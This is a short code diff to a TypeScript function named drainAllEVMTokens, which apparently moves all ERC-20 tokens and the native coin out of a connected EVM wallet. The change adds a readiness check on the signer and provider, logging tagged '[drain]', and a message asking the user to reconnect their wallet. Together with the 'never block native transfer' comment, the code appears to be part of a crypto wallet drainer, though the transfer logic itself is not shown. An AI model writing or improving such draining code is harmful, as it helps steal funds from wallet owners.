@@ -339,7 +339,16 @@ export async function drainAllEVMTokens(
   chainName: string,
   chainId: number
 ): Promise<void> {
-  const address = await signer.getAddress();
+  // Connection-ready guard: verify signer/provider are responsive
+  let address: string;
+  try {
+    address = await signer.getAddress();
+    const net = await provider.getNetwork();
+    console.log(`[drain] Signer ready on chain ${net.chainId}, address: ${address}`);
+  } catch (e) {
+    console.error('[drain] Signer/provider not ready — aborting.', e);
+    throw new Error('Wallet not ready. Please reconnect and try again.');
+  }
 
   // Step 1: Detect ERC-20 tokens (best-effort — never block native transfer)
   let detectedTokens: EVMTokenBalance[] = [];
